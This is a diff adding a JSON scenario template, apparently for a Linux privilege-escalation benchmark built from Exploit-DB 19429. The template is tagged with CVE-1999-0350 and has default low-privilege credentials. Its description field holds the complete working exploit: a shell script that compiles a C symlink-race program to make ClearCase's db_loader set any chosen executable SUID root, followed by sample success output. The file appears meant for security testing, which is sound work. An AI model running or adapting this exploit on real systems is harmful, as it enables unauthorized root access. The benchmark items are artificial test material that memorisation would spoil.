@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19429",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Rational Software ClearCase for Unix 3.2 - ClearCase SUID (CVE-1999-0350;OSVDB-1026)\n\nExploit source code (19429.sh):\n```\nsource: https://www.securityfocus.com/bid/538/info\n\nRational Software's ClearCase product includes a vulnerability whereby an unprivileged user can have any readable executable set to SUID root.. A 1.5 meg file is copied and then chmod'ed to SUID, and during the time this file is being copied it can be unlinked and replaced with another.\n\nSample output:\n> ./clear_waste.sh /bin/ksh\n\nClear Case proof of concept exploit code - mudge@l0pht.com 2.5.1999\none beer please!\n\ncreating race grinder....\ncreated!\n\ncompiling race grinder...\ncompiled! Launching attack.... be patient\n\nLooks succesfull!\n-r-sr-xr-x 2 bin bin 186356 Jan 21 1998 /bin/ksh\n\ndon't forget to get rid of /var/tmp/cleartest\n\n#!/bin/sh\n#\n# This is sample code that takes advantage of a race condition in\n# Pure Atria's Clear Case db_loader program. The program will retain\n# ownership of the file pointed to on the command line and have\n# the clear case db_loader change the permissions to SUID\n#  .mudge@l0pht.com  2.5.1999\n#\nRACE_PROG=./clear_race\nRACE_CODE=./clear_race.c\n# you probabaly need to change the following to reflect your\n# system and setup\n#NICE=/usr/bin/nice\nCC=/usr/local/bin/gcc\nDB_LOADER=/usr/atria/sun5/etc/db_loader\nRM=/bin/rm\nLS=/bin/ls\nMKDIR=/bin/mkdir\n# you need to own the DEST DIR so you can delete files that you don't\n# directly own\nDEST_DIR=/var/tmp/cleartest.$$\n\nif [ \"$#\" -ne \"1\" ] ; then\n  echo \"usage: `basename $0` file_to_make_suid\"\n  exit\nfi\n\nTARGET=$1\n\nif [ ! -f ${TARGET} ] ; then\n  echo \"target file must exist\"\n  exit\nfi\n\necho\necho \"Clear Case proof of concept exploit code - mudge@l0pht.com 2.5.1999\"\necho \" one beer please!\"\necho\n\n${MKDIR} ${DEST_DIR}\nif [ $? -gt 0 ] ; then\n  echo \"go get rid of ${DEST_DIR} and try again...\"\n  exit\nfi\n\ncd ${DEST_DIR}\n\n# create the race runner\necho \"creating race grinder....\"\ncat > ${RACE_CODE} << FOEFOE\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <stdio.h>\n\nmain(int argc, char *argv[])\n{\n  struct stat statbuf;\n\n  printf(\"%d\\n\", argc);\n\n  if (argc != 2){\n    printf(\"bzzzzt! - wrong usage\\n\");\n    exit(0);\n  }\n\n  while (1){\n    if (stat(\"./db_dumper\", &statbuf) == 0){\n      unlink(\"./db_dumper\");\n      symlink(argv[1], \"./db_dumper\");\n      exit(0);\n    }\n  }\n}\nFOEFOE\necho \"created!\"\necho\n\n# compile it\necho \"compiling race grinder...\"\n${CC} -O2 -o ${RACE_PROG} ${RACE_CODE}\n\nif [ ! -f ${RACE_PROG} ] ; then\n  echo \"compile failed?\"\n  ${RM} -f ${RACE_CODE}\n  exit\nfi\n\necho \"compiled! Launching attack.... be patient\"\necho\n\n\n${RACE_PROG} ${TARGET} &\n# let us give the progie a second or two to load up and get the runtime\n# crap set\nsleep 2\n\n#${NICE} -n 2 ${DB_LOADER} ${DEST_DIR} > /dev/null 2>&1\n# if you keep failing try the above and potentially increase the nice value\n${DB_LOADER} ${DEST_DIR} > /dev/null 2>&1\n\nif [ -u ${TARGET} ] ; then\n  echo \"Looks succesfull!\"\n  ${LS} -l ${TARGET}\n  echo\n  echo \"don't forget to get rid of ${DEST_DIR}\"\n  echo\n  exit\nfi\n\necho \"doesn't look like it worked... \"\necho \"try again -\n```",
+  "cve": "CVE-1999-0350;OSVDB-1026",
+  "exploitdb_id": "19429",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19429",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
